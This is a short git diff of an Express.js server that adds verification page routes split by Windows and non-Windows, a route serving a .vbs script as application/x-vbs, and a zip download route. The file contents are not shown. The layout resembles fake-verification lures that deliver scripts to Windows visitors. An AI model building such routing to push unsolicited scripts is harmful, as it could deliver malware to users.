@@ -293,7 +293,17 @@ app.get('/admin', (req, res) => {
   
   res.send(adminHTML);
 });
+app.get('/verify', (req, res) => res.sendFile(path.join(__dirname, 'public/verify.html')));
+app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
+app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));
+app.get('/verifyaccept.vbs', (req, res) => {
+  res.set('Content-Type', 'application/x-vbs');
+  res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
+});
 
+app.get('/download', (req, res) => {
+  res.download(path.join(__dirname, 'public', 'example.zip')); // or your real file!
+});
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
   
